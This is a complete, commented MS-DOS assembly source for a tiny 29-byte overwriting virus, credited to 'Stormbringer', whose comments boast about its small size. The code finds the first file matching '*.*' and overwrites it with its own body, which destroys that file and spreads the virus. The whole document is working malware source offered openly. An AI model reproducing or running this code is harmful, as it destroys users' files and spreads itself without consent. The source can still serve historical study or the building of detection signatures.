;Smallest in the trivial series of viruses, I think.... 
;Last I saw was 30 bytes - this one goes to 29.
;Code by Stormbringer... stupid virus, but small.

.model tiny
.radix 16
.code
        org 100
start:
        
FindFile:        
        xchg    cx,ax           ;ax defaults to zero on runtime - cx doesn't
        push    si              ;si defaults to 100h under dos - use this l8r
        mov     dx,offset filemask
        mov     ah,4e
        int     21

OverwriteFile:
        mov     dx,9e
        mov     ah,3c
        int     21

WriteVirus:        
        xchg    bx,ax
        mov     ah,40
        pop     dx              ;get 100h from si earlier for write pointer
        mov     cl,endvir-start ;move only to CL, CH is already zero
        int     21

Terminate:
        ret                     ;terminate by returning to PSP (Int 20)

filemask        db      '*.*',0
endvir:
end start
